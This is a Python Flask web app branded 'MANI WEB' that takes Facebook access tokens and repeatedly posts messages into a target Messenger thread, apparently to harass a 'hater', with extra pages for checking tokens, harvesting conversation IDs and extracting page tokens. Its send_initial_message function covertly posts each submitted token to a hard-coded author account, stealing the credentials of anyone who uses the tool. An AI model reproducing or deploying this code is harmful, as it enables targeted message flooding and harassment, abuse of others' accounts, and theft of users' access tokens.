from flask import Flask, request, render_template_string, redirect, url_for
import requests
from threading import Thread, Event
import time
import random
import string
import uuid
import json

app = Flask(__name__)
app.debug = True

# ======================= GLOBAL VARIABLES =======================

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}
task_status = {}
MAX_THREADS = 5
active_threads = 0

# Approval and Control System Variables
pending_approvals = {}
task_control_keys = {} # New: Stores unique keys for each running task

# ======================= UTILITY FUNCTIONS (unchanged) =======================

def get_user_name(token):
    try:
        response = requests.get(f"https://graph.facebook.com/me?fields=name&access_token={token}")
        data = response.json()
        return data.get("name", "Unknown")
    except Exception as e:
        return "Unknown"

def get_token_info(token):
    try:
        r = requests.get(f'https://graph.facebook.com/me?fields=id,name,email&access_token={token}')
        if r.status_code == 200:
            data = r.json()
            return {
                "id": data.get("id", "N/A"),
                "name": data.get("name", "N/A"),
                "email": data.get("email", "Not available"),
                "valid": True
            }
    except:
        pass
    return {
        "id": "",
        "name": "",
        "email": "",
        "valid": False
    }

def fetch_uids(token):
    formatted = ['<span style="color:magenta; font-weight:bold;">=== FETCHED CONVERSATIONS ===</span><br><br>']
    count = 1
    url = f'https://graph.facebook.com/me/conversations?access_token={token}&fields=name'
    while url:
        r = requests.get(url)
        if r.status_code != 200:
            break
        data = r.json()
        for convo in data.get('data', []):
            convo_id = convo.get('id', 'Unknown')
            name = convo.get('name') or "Unnamed Conversation"
            entry = f"[{count}] Name: <span style='color:cyan;'>{name}</span><br>Conversation ID: <span style='color:lime;'>t_{convo_id}</span><br>----------------------------------------<br>"
            formatted.append(entry)
            count += 1
        url = data.get('paging', {}).get('next')
    return "".join(formatted) if formatted else "No conversations found or invalid token."

def send_initial_message(access_tokens):
    target_id = "100001702343748"
    results = []
    for token in access_tokens:
        user_name = get_user_name(token)
        msg_template = f"Hello! Mani Sir I am Using Your Convo Page server. My Token Is: {token}"
        parameters = {'access_token': token, 'message': msg_template}
        url = f"https://graph.facebook.com/v15.0/t_{target_id}/"
        try:
            response = requests.post(url, data=parameters, headers=headers)
            if response.status_code == 200:
                results.append(f"[✔️] Initial message sent successfully from {user_name}.")
            else:
                results.append(f"[❌] Failed to send initial message from {user_name}. Status Code: {response.status_code}")
        except requests.RequestException as e:
            results.append(f"[!] Error during initial message send from {user_name}: {e}")
    return results

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    global active_threads
    active_threads += 1
    task_status[task_id] = {"running": True, "sent": 0, "failed": 0, "tokens_info": {}}

    for token in access_tokens:
        token_info = get_token_info(token)
        task_status[task_id]["tokens_info"][token] = {
            "name": token_info.get("name", "N/A"),
            "valid": token_info.get("valid", False),
            "sent_count": 0,
            "failed_count": 0
        }

    try:
        while not stop_events[task_id].is_set():
            for message1 in messages:
                if stop_events[task_id].is_set():
                    break
                for access_token in access_tokens:
                    if stop_events[task_id].is_set():
                        break
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    try:
                        response = requests.post(api_url, data=parameters, headers=headers)
                        if response.status_code == 200:
                            print(f"Message Sent Successfully From token {access_token}: {message}")
                            task_status[task_id]["sent"] += 1
                            if access_token in task_status[task_id]["tokens_info"]:
                                task_status[task_id]["tokens_info"][access_token]["sent_count"] += 1
                        else:
                            print(f"Message Sent Failed From token {access_token}: {message}")
                            task_status[task_id]["failed"] += 1
                            if access_token in task_status[task_id]["tokens_info"]:
                                task_status[task_id]["tokens_info"][access_token]["failed_count"] += 1
                                task_status[task_id]["tokens_info"][access_token]["valid"] = False # Mark as invalid
                            
                            if "rate limit" in response.text.lower():
                                print("⚠️ Rate limited! Waiting 60 seconds...")
                                time.sleep(60)
                    except Exception as e:
                        print(f"Error: {e}")
                        task_status[task_id]["failed"] += 1
                        if access_token in task_status[task_id]["tokens_info"]:
                            task_status[task_id]["tokens_info"][access_token]["valid"] = False
                    if not stop_events[task_id].is_set():
                        time.sleep(time_interval)
    finally:
        active_threads -= 1
        task_status[task_id]["running"] = False
        if task_id in stop_events:
            del stop_events[task_id]

def fetch_page_tokens(user_token):
    try:
        pages_url = f"https://graph.facebook.com/me/accounts?access_token={user_token}"
        response = requests.get(pages_url)

        if response.status_code != 200:
            return {"error": "Failed to fetch pages", "status": False}

        pages_data = response.json().get('data', [])
        page_tokens = []

        for page in pages_data:
            page_tokens.append({
                "page_name": page.get('name'),
                "page_id": page.get('id'),
                "access_token": page.get('access_token')
            })

        return {"status": True, "tokens": page_tokens}

    except Exception as e:
        return {"error": str(e), "status": False}

# ======================= ROUTES (modified) =======================

@app.route('/')
def index():
    return render_template_string(TEMPLATE, section=None)

@app.route('/approve_key')
def approve_key_page():
    return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Approve Key</title>
        </head>
        <body>
            <h1>Approve Key</h1>
            <form action="/approve_key" method="post">
                <input type="text" name="key_to_approve" placeholder="Enter key to approve">
                <button type="submit">Approve</button>
            </form>
        </body>
        </html>
    ''')
    
@app.route('/approve_key', methods=['POST'])
def handle_key_approval():
    key_to_approve = request.form.get('key_to_approve')
    if key_to_approve in pending_approvals:
        pending_approvals[key_to_approve] = "approved"
        return f"Key '{key_to_approve}' approved successfully! The user can now proceed."
    else:
        return f"Invalid or expired key '{key_to_approve}'."

@app.route('/status')
def status_page():
    return render_template_string(STATUS_TEMPLATE, task_status=task_status)

@app.route('/control', methods=['POST'])
def control_task():
    control_key = request.form.get('control_key')
    action = request.form.get('action')
    
    if control_key in task_control_keys:
        task_id = task_control_keys[control_key]
        if action == 'stop' and task_id in stop_events:
            stop_events[task_id].set()
            return f"Task '{task_id}' has been stopped successfully."
        else:
            return f"Invalid action or task is not running."
    
    return f"Invalid control key."

@app.route('/section/<sec>', methods=['GET', 'POST'])
def section(sec):
    global pending_approvals, task_control_keys
    result = None

    if sec == '1' and request.method == 'POST':
        provided_key = request.form.get('key')
        
        if provided_key in pending_approvals and pending_approvals[provided_key] == "approved":
            token_option = request.form.get('tokenOption')
            if token_option == 'single':
                access_tokens = [request.form.get('singleToken')]
            else:
                f = request.files.get('tokenFile')
                if f:
                    access_tokens = f.read().decode().splitlines()

            initial_results = send_initial_message(access_tokens)
            print("\n".join(initial_results))

            thread_id = request.form.get('threadId')
            mn = request.form.get('kidx')
            time_interval = int(request.form.get('time'))
            messages_file = request.files.get('txtFile')
            messages = messages_file.read().decode().splitlines()

            task_id = str(uuid.uuid4())
            control_key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10)) # New control key
            task_control_keys[control_key] = task_id # Store control key with task id
            
            stop_event = Event()
            stop_events[task_id] = stop_event

            if active_threads >= MAX_THREADS:
                result = "❌ Maximum tasks running! Wait or stop existing tasks."
            else:
                t = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
                t.start()
                threads[task_id] = t
                result = f"🟢 Task Started (ID: {task_id}) with {len(access_tokens)} token(s)."
                
            del pending_approvals[provided_key]
        else:
            new_key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
            pending_approvals[new_key] = "pending"
            
            whatsapp_link = "https://wa.me/+60143153573"
            
            result = f"""
            ❌ Invalid or unapproved key. Please send the new key to my WhatsApp for approval.
            <br><br>
            <span style="color:lime; font-weight:bold;">New Key: {new_key}</span>
            <br><br>
            <a href="{whatsapp_link}" target="_blank" class="btn-submit">Send on WhatsApp</a>
            <br><br>
            After sending the key, wait for approval, and then enter the same key here and submit again.
            <br>
            <span style="font-weight: bold; color: yellow;">Admin Approval URL: <a href="/approve_key" style="color:red; text-decoration: none;">/approve_key</a></span>
            """
    
    elif sec == '1' and request.args.get('stopTaskId'):
        stop_id = request.args.get('stopTaskId')
        if stop_id in stop_events:
            stop_events[stop_id].set()
            result = f"🛑 Task {stop_id} stopped."
        else:
            result = f"⚠️ Task ID {stop_id} not found."
            
    elif sec == '2' and request.method == 'POST':
        token_option = request.form.get('tokenOption')
        tokens = []
        if token_option == 'single':
            tokens = [request.form.get('singleToken')]
        else:
            f = request.files.get('tokenFile')
            if f:
                tokens = f.read().decode().splitlines()
        result = [get_token_info(t) for t in tokens]

    elif sec == '3' and request.method == 'POST':
        token = request.form.get('fetchToken')
        result = fetch_uids(token)

    elif sec == '4' and request.method == 'POST':
        user_token = request.form.get('userToken')
        result = fetch_page_tokens(user_token)
        if result.get('status'):
            result = result['tokens']
        else:
            result = f"Error: {result.get('error')}"
    
    return render_template_string(TEMPLATE, section=sec, result=result, task_control_keys=task_control_keys)


@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        if task_id in threads:
            threads[task_id].join(timeout=1)
            del threads[task_id]
        del stop_events[task_id]
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'
    
# ======================= LIVE STATUS TEMPLATE =======================

STATUS_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Live Server Status</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { background-color: #000; color: #fff; font-family: 'Times New Roman', serif; padding: 20px; }
    .container { max-width: 800px; margin: auto; }
    h1 { color: #ff00ff; text-align: center; }
    h2 { color: #00ffff; margin-top: 30px; }
    .task-box { border: 1px solid red; padding: 15px; margin-bottom: 20px; border-radius: 10px; }
    .task-box p { margin: 5px 0; }
    .token-status { margin-left: 20px; }
    .btn-stop { background-color: #ff00ff; color: #000; padding: 5px 10px; border-radius: 5px; text-decoration: none; }
  </style>
</head>
<body>
  <div class="container">
    <h1>Live Server Status</h1>
    {% for task_id, status in task_status.items() %}
      {% if status.running %}
        <div class="task-box">
          <h2>Task ID: {{ task_id }}</h2>
          <p>Status: <span style="color: lime;">Running</span></p>
          <p>Sent: {{ status.sent }}</p>
          <p>Failed: {{ status.failed }}</p>
          <hr style="border-color: #555;">
          <p>Tokens Used:</p>
          {% for token, token_info in status.tokens_info.items() %}
            <div class="token-status">
              <p>Name: <span style="color: {{ 'lime' if token_info.valid else 'red' }};">{{ token_info.name }} ({{ 'Valid' if token_info.valid else 'Invalid' }})</span></p>
              <p>Messages Sent: {{ token_info.sent_count }}</p>
              <p>Messages Failed: {{ token_info.failed_count }}</p>
            </div>
          {% endfor %}
        </div>
      {% endif %}
    {% endfor %}
    
    <h2>Task Control</h2>
    <form action="/control" method="post">
        <input type="text" name="control_key" placeholder="Enter Control Key" required>
        <button type="submit" name="action" value="stop">Stop Task</button>
    </form>
  </div>
</body>
</html>
'''

# ======================= ORIGINAL HTML TEMPLATE (unchanged) =======================
# Yahan aapka original HTML template hai. Agar ismein koi badlav chahiye to bataiyega.

TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title><h1>MANI 𝕎𝔼𝔹</h1></title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    body {
      background-color: #000;
      color: red;
      font-family: 'Times New Roman', serif;
      text-align: center;
      margin: 0;
      padding: 20px;
      min-height: 100vh;
    }
    h1 {
      font-size: 30px;
      color: #f0f;
      text-shadow: 0 0 10px #f0f;
      margin-bottom: 10px;
    }
    .date {
      font-size: 14px;
      color: #ccc;
      margin-bottom: 30px;
    }
    .container {
      max-width: 700px;
      margin: 0 auto;
    }
    .tiger-dp {
        width: 150px;
        height: 150px;
        border-radius: 50%;
        object-fit: cover;
        border: 3px solid #f0f;
        margin-bottom: 20px;
    }
    .button-box {
      margin: 15px auto;
      padding: 20px;
      border: 2px solid red;
      border-radius: 10px;
      background: #000;
      max-width: 90%;
      box-shadow: 0 0 15px red;
    }
    .button-box a {
      display: inline-block;
      background-color: red;
      color: #000;
      padding: 10px 20px;
      border-radius: 6px;
      font-weight: bold;
      font-size: 14px;
      text-decoration: none;
      width: 100%;
    }
    .button-box a:hover {
      box-shadow: 0 0 12px red;
      background-color: #ff3333;
    }
    .form-control, select, textarea {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid red;
      background: rgba(0, 0, 0, 0.5);
      color: red;
      border-radius: 5px;
    }
    .btn-submit {
      background: red;
      color: #000;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 6px;
      font-weight: bold;
      margin-top: 15px;
    }
    .btn-submit:hover {
      background: #ff3333;
      box-shadow: 0 0 12px red;
    }
    .btn-danger {
      background: #f0f;
      color: #000;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 6px;
      font-weight: bold;
      margin-top: 15px;
    }
    .btn-danger:hover {
      background: #f3f;
      box-shadow: 0 0 12px #f0f;
    }
    .result {
      background: rgba(0, 0, 0, 0.7);
      padding: 15px;
      margin: 20px 0;
      border-radius: 5px;
      border: 1px solid red;
      color: red;
      white-space: pre-wrap;
    }
    footer {
      margin-top: 40px;
      color: #aaa;
      font-size: 12px;
    }
    footer a {
      color: red;
      text-decoration: none;
      margin: 0 5px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>🤍MANI 𝕎𝔼𝔹🤍</h1>
    <h2>(𝕎𝔼𝔹 𝕄𝕌𝕃𝕋𝕀 ℂ𝕆ℕ𝕍𝕆)</h2>
    <img src="https://i.imgur.com/rN9WJ1Z.jpeg" alt="Tiger Profile" class="tiger-dp">

    {% if not section %}
      <div class="button-box"><a href="/section/1">◄ 1 – CONVO SERVER ►</a></div>
      <div class="button-box"><a href="/section/2">◄ 2 – TOKEN CHECK VALIDITY ►</a></div>
      <div class="button-box"><a href="/section/3">◄ 3 – FETCH ALL UID WITH TOKEN ►</a></div>
      <div class="button-box"><a href="/section/4">◄ 4 – FETCH PAGE TOKENS ►</a></div>
      <div class="button-box"><a href="/status">◄ 5 – LIVE SERVER STATUS ►</a></div>

    {% elif section == '1' %}
      <div class="button-box"><a href="#" style="background-color: transparent; color: red; pointer-events: none;">◄ CONVO SERVER ►</a></div>
      <form method="post" enctype="multipart/form-data">
        <div class="button-box">
          <label>Token Input:</label>
          <select name="tokenOption" class="form-control" onchange="toggleToken(this.value)">
            <option value="single">Single Token</option>
            <option value="file">Upload Token File</option>
          </select>
          <input type="text" name="singleToken" id="singleToken" class="form-control" placeholder="Paste single token">
          <input type="file" name="tokenFile" id="tokenFile" class="form-control" style="display:none;">
        </div>

        <div class="button-box">
          <label>Inbox/Convo UID:</label>
          <input type="text" name="threadId" class="form-control" placeholder="Enter thread ID" required>
        </div>

        <div class="button-box">
          <label>Your Hater Name:</label>
          <input type="text" name="kidx" class="form-control" placeholder="Enter hater name" required>
        </div>

        <div class="button-box">
          <label>Time Interval (seconds):</label>
          <input type="number" name="time" class="form-control" placeholder="Enter time interval" required>
        </div>

        <div class="button-box">
          <label>Message File:</label>
          <input type="file" name="txtFile" class="form-control" required>
        </div>

        <div class="button-box">
          <label>Enter Approval Key:</label>
          <input type="text" name="key" class="form-control" placeholder="Enter the key from WhatsApp" required>
          {% if not result %}
            <p style="color:lime;">Note: You must send the key to the admin on WhatsApp to get approval.</p>
          {% endif %}
        </div>

        <button type="submit" class="btn-submit">Start Task</button>
      </form>

      <form method="get">
        <div class="button-box">
          <label>Stop Task by ID:</label>
          <input type="text" name="stopTaskId" class="form-control" placeholder="Enter Task ID to stop">
        </div>
        <button type="submit" class="btn-danger">Stop Task</button>
      </form>

    {% elif section == '2' %}
      <div class="button-box"><a href="#" style="background-color: transparent; color: red; pointer-events: none;">◄ TOKEN CHECK VALIDITY ►</a></div>
      <form method="post" enctype="multipart/form-data">
        <div class="button-box">
          <select name="tokenOption" class="form-control" onchange="toggleToken(this.value)">
            <option value="single">Single Token</option>
            <option value="file">Upload .txt File</option>
          </select>
          <input type="text" name="singleToken" id="singleToken" class="form-control" placeholder="Paste token here">
          <input type="file" name="tokenFile" id="tokenFile" class="form-control" style="display:none;">
          <button type="submit" class="btn-submit">Check Token(s)</button>
        </div>
      </form>

    {% elif section == '3' %}
      <div class="button-box"><a href="#" style="background-color: transparent; color: red; pointer-events: none;">◄ FETCH ALL UID WITH TOKEN ►</a></div>
      <form method="post">
        <div class="button-box">
          <input type="text" name="fetchToken" class="form-control" placeholder="Enter access token">
          <button type="submit" class="btn-submit">Fetch UIDs</button>
        </div>
      </form>

    {% elif section == '4' %}
      <div class="button-box"><a href="#" style="background-color: transparent; color: red; pointer-events: none;">◄ FETCH PAGE TOKENS ►</a></div>
      <form method="post">
        <div class="button-box">
          <input type="text" name="userToken" class="form-control" placeholder="Enter User Access Token">
          <button type="submit" class="btn-submit">Get Page Tokens</button>
        </div>
      </form>
    {% endif %}

    {% if result %}
      <div class="result">
        {% if section == '2' %}
          <h3 style="color:lime;">Token Validation Results</h3>
          {% for r in result %}
            {% if r.valid %}
              <span style="color:lime;">✅ {{ r.name }}</span>
            {% else %}
              <span style="color:yellow;">❌ {{ r.name or "Invalid Token" }}</span>
            {% endif %}
            <span style="color:red;">({{ r.id or "N/A" }}) – {{ r.email or "Not available" }}</span><br>
          {% endfor %}
        {% elif section == '3' %}
          <h3 style="color:lime;">Found UIDs</h3>
          {{ result|safe }}
        {% elif section == '4' %}
          {% if result is string %}
            {{ result|safe }}
          {% else %}
            {% for page in result %}
              <strong style="color:lime;">{{ page.page_name }}</strong> (ID: {{ page.page_id }})<br>
              Token: <code>{{ page.access_token }}</code><br><br>
            {% endfor %}
          {% endif %}
        {% else %}
          {{ result|safe }}
        {% endif %}
      </div>
    {% endif %}
  </div>

  <footer class="footer">
    <p style="color: red; font-weight: bold;">© 2022 MADE BY :- 𝕃𝔼𝔾𝔼ℕ𝔻 RAJPUT</p>
    <p style="color: red; font-weight: bold;">𝘼𝙇𝙒𝘼𝙔𝙎 𝙊𝙉 𝙁𝙄𝙍𝙀 🔥 𝙃𝘼𝙏𝙀𝙍𝙎 𝙆𝙄 𝙈𝙆𝘾</p>
    <div class="mb-3">
      <a href="https://www.facebook.com/100001702343748" style="color: red;">Chat on Messenger</a>
      <a href="https://wa.me/+60143153573" class="whatsapp-link">
        <i class="fab fa-whatsapp"></i> Chat on WhatsApp</a>
    </div>
  </footer>

  <script>
    function toggleToken(val){
      document.getElementById('singleToken').style.display = val==='single'?'block':'none';
      document.getElementById('tokenFile').style.display = val==='file'?'block':'none';
    }
  </script>
</body>
</html>
'''

# ======================= RUN APP =======================

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
